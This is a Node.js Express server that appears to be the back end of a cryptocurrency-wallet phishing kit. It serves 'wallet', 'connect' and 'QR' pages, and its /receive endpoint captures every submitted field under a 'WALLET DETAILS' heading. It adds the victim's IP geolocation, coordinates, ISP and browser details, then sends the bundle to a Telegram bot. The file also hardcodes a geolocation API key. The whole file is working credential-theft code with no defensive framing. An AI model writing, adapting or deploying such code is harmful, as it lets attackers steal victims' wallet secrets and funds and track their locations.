const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./config/settings.js');
const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const fs = require('fs').promises;

app.use(express.static(path.join(`${__dirname}`)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.set('trust proxy', true);

// Send Telegram Message
const sendTelegramMessage = (text) => {
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
        chat_id: chatId,
        text: text,
    });

    const options = {
        hostname: 'api.telegram.org',
        path: '/bot' + botToken + '/sendMessage',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': params.length,
        },
    };

    const req = https.request(options, (res) => {
        // Handle the response if needed
    });

    req.write(params);
    req.end();
};

app.post('/receive', async (req, res) => {
    try {
        let message = '';
        let myObject = req.body;

        const sendAPIRequest = async (ipAddress) => {
            try {
                const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
                return apiResponse.data;
            } catch (error) {
                console.error("API Request Error:", error);
                throw error;
            }
        };

        const ipAddress = getClientIp(req);
        const ipAddressInformation = await sendAPIRequest(ipAddress);
        const userAgent = req.headers["user-agent"];
        const systemLang = req.headers["accept-language"];
        const myObjects = Object.keys(myObject);

        console.log(myObjects);

        message += `✅ WALLET DETAILS | USER_${ipAddress}\n\n`;

        for (const key of myObjects) {
            console.log(`${key}: ${myObject[key]}`);
            message += `${key}: ${myObject[key]}\n`;
        }

        message += `🌍 GEO-IP INFO\n` +
            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
            `CITY             : ${ipAddressInformation.location.city}\n` +
            `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
            `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
            `COUNTRY          : ${ipAddressInformation.country.name}\n` +
            `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
            `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
            `💻 SYSTEM INFO\n` +
            `USER AGENT       : ${userAgent}\n` +
            `SYSTEM LANGUAGE  : ${systemLang}\n`;

        res.send("Data received successfully");
        console.log(message);
        sendTelegramMessage(message);
    } catch (error) {
        console.error("Error in /receive endpoint:", error);
        res.status(500).send("Internal Server Error");
    }
});

// Other Routes
app.get('/wallet', async (req, res) => {
    try {
        const fileName = `wallet.html`;
        const htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
        res.send(htmlContent);
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/connect', async (req, res) => {
    try {
        const fileName = `connect.html`;
        const htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
        res.send(htmlContent);
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.get('/qr', async (req, res) => {
    try {
        const fileName = `barcode.html`;
        const htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
        res.send(htmlContent);
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});
